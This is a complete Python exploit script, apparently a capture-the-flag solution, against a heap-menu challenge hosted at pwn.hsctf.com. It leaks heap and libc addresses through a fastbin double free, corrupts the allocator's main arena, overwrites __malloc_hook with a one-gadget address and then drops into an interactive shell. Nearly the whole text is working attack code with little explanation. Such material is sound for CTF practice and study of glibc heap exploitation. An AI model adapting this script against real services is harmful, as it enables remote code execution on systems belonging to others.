from ptrlib import *

def sice_deet(size, data):
    sock.recvuntil("> ")
    sock.sendline("1")
    sock.recvuntil("> ")
    sock.sendline(str(size))
    sock.recvuntil("> ")
    sock.send(data)

def observe_deet(index):
    sock.recvuntil("> ")
    sock.sendline("2")
    sock.recvuntil("> ")
    sock.sendline(str(index))
    return sock.recvline().rstrip()

def antisice_deet(index):
    sock.recvuntil("> ")
    sock.sendline("3")
    sock.recvuntil("> ")
    sock.sendline(str(index))

#sock = Process("./hard-heap")
libc = ELF("./libc.so.6")
#sock = Socket("localhost", 9999)
sock = Socket("pwn.hsctf.com", 5555)
main_arena = 0x3c4b20
delta = 0x58
one_gadget = 0xf1147

# leak heap
fake_chunk = b"A" * 0x30
fake_chunk += p64(0)
fake_chunk += p64(0x51)
sice_deet(0x48, fake_chunk) # sice:0 (0x00)
sice_deet(0x48, "1") # sice:1 (0x50)
sice_deet(0x48, "2") # 0xa0
sice_deet(0x48, "3") # 0xf0
antisice_deet(0)
antisice_deet(1)
antisice_deet(0)
addr_heap = u64(observe_deet(0)) - 0x50 # addr of sice:0
logger.info("heap = " + hex(addr_heap))
assert addr_heap > 0

# overlap & libc base
sice_deet(0x48, p64(addr_heap + 0x40)) # sice:4 = sice:0
sice_deet(0x48, "X" * 8) # sice:5
sice_deet(0x48, "AAAA") # sice:6
payload = p64(0) + p64(0xa1)
sice_deet(0x48, payload) # sice:7
antisice_deet(1)
libc_base = u64(observe_deet(1)) - main_arena - delta
logger.info("libc base = " + hex(libc_base))
addr_one_gadget = libc_base + 0x4526a

# create heap address on main_arena before top_chunk
sice_deet(0x20, "dummy") # sice:8
antisice_deet(8)

# fastbin corruption attack
sice_deet(0x48, "9") # sice:9
sice_deet(0x48, "10") # sice:10
sice_deet(0x48, "11") # sice:11
antisice_deet(10)
antisice_deet(11)
antisice_deet(10)
sice_deet(0x48, p64(libc_base + main_arena + 13)) # sice:12
sice_deet(0x48, "dummy") # sice:13
sice_deet(0x48, "dummy") # sice:14
payload = b'\x00' * 3
payload += p64((libc_base + main_arena + 0x20)) # fastbin for 0x50
payload += p64(0x51)
sice_deet(0x48, payload) # now fastbin(for 0x50) is &top_chunk (sice:15)
target = libc_base + libc.symbol("__malloc_hook") - 27 - 8
payload = p64(0) * 5
payload += p64(target)
sice_deet(0x48, payload) # top_chunk (sice:16)

# overwrite __malloc_hook
sice_deet(0x48, b'\xff' * 0x13 + p64(libc_base + one_gadget))

# get the shell!
sock.recvuntil("> ")
sock.sendline("1")
sock.recvuntil("> ")
sock.sendline("11")

sock.interactive()
